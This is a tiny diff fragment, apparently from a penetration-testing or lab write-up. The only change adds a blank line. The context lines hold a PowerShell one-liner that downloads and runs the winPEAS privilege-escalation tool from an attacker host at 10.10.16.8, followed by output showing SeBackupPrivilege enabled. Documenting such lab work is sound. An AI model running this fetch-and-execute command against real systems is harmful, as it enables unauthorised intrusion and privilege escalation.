@@ -30,6 +30,7 @@ nominative domain admin accounts.
 echo IEX(New-Object Net.WebClient).DownloadString('http://10.10.16.8:8080/winPEASany.exe') | powershell -noprofile -
 ```
 
+
 ```
 Privilege   : SeBackupPrivilege
 Attributes  : SE_PRIVILEGE_ENABLED_BY_DEFAULT, SE_PRIVILEGE_ENABLED
